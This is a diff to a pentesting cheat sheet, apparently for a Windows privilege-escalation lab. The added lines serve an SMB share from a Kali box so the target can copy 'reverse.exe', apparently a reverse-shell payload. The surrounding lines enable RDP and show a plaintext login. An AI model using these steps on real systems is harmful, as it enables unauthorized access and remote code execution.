@@ -25,6 +25,15 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
 netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
 ````
+## SMB File Transfer 
+- On kali box:
+````
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+````
+- On Windows (update the IP address with your Kali IP):
+````
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+````
 ## xfreerdp
 ````
 xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
